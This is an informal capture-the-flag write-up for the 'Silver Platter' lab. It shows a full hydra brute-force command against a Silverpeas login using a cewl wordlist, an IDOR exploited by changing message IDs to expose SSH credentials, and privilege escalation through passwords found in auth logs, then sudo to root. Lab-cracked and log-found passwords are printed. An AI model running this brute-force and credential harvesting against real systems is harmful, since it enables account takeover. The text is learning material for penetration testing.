If you'd like to get in touch with us, please reach out to our project manager on “Silverpeas”. His username is "scr1ptkiddy".

### HTTP(8080):-Is Running

We got Silverpeas Running on it :- 

Accessible by /Silverpeas ➖

## Initial Access:-

Despite the lack of findings, the contact form provides a reference to 
Silverpeas. Using this clue, we try accessing 
http://silverpeas.thm:8080/silverpeas/ and discover a login page for 
Silverpeas. There are some known CVEs for this software, we’ll get to 
this later.

http://silverpeas.thm:8080/silverpeas
to this edit /etc/hosts


Since we have a username from contact form, we could try to brute-force the login using [hydra](https://github.com/vanhauser-thc/thc-hydra).
 As the room description gives us the clue, rockyou.txt may not be the 
help here, but we can create a wordlist using the words on the 
http://silverplatter.thm page. We use [cewl](https://github.com/digininja/CeWL) to do this.

Why We Use This: (they check it against the rockyou.txt wordlist - that's how 'cool' they are). 

cewl http://silverplatter.thm > pass.txt
to get all keyword as passwd


Now, we intercept and analyze a login request using Burp to gather the necessary information for crafting our Hydra command. This involves capturing the HTTP POST request sent when attempting to log in, identifying critical details such as the target URL, form parameters, and the server’s response to incorrect credentials.

Analyzing Key Components:

- Target: silverplatter.thm
- Port: 8080
- Form Path: /silverpeas/AuthenticationServlet
- Parameters: Login, Password, DomainId
- Failure Condition: The response contains “Login or password incorrect.”


hydra -l scr1ptkiddy -P pass.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" -V
use hydra to get pass


We got The Passwd Also:-

Next Step to Login :-Usrname:scr1ptkiddy & Passwd:******g

{scr1ptkiddy adipiscing}

I Got Login To application:-

Upon logging in, I noticed a notification, which I clicked on, revealing a message from the **Manager**. I will inspect the **message system** further at a later time to gather more information.

# Exploiting Insecure Direct Object Reference (IDOR)

After clicking **“See more”**, I was redirected to the **My Notifications > Inbox** page, which stores messages.

![image.png](attachment:de926853-e352-46b7-8778-44adaef98c55:image.png)

However, something seemed off: the URL displayed an ID of **5**, yet only one message was present on the page. This raised a red flag, and my first thought was that it might be an **Insecure Direct Object Reference (IDOR)** vulnerability.

![image.png](attachment:b63b57e5-b294-432d-80d6-e5d7195f0dbc:image.png)

I decided to test this theory by changing the ID in the URL from **5** to **4**, and it worked! The page displayed a message that was not visible in the inbox, confirming the presence of an **IDOR** vulnerability.
After that, I continued testing by starting with **ID=0** and incrementally checking higher values. Eventually, I discovered that **ID=6** returned a message containing **SSH credentials**, specifically the username **Tim**.

![image.png](attachment:b60b9a0d-d542-4fe6-b634-1130890131b0:image.png)

I then used the **SSH credentials** obtained from the message to log in.

![image.png](attachment:4c6e243b-292e-4dfe-8c1a-5ef5c6d48a61:image.png)

Upon accessing the system, I found the **first flag** located in the **home directory** of the user **Tim**.

by doing 


cat user.txt


we need to do post-exploitation on linux 

 

### Post-Exploitation:-


tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
here is unique adm grp as admin grop so to check at log and did bureforues on by ls -la and by grep -ir 'password and we got postgresql database passwd and getin to it 


auth.log.2:Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
auth.log.2:Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3



and gone to root home  dir 

tim@silver-platter:/home$ su tyler


we used paswd and get login 

now again post-expositions start here 


tyler@silver-platter:~$ id 
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
 

get into root user now 


sudo su 
type passwd what u got first on it 


just go to /root
 dir and do 


ls
cat root.txt


# **Summary:-**

1. **Enumeration:** Identified three open ports and discovered Silverpeas on port 8080.
2. **Brute-forcing:** Used a custom wordlist to crack Silverpeas credentials.
3. **Exploitation:** Leveraged a Silverpeas vulnerability to extract SSH credentials.
4. **Privilege Escalation:** Accessed log files to retrieve passwords, switched users, and escalated to root.

This methodical approach showcases the importance of enumeration, targeted brute-forcing, and exploiting misconfigurations or known vulnerabilities to complete the room.
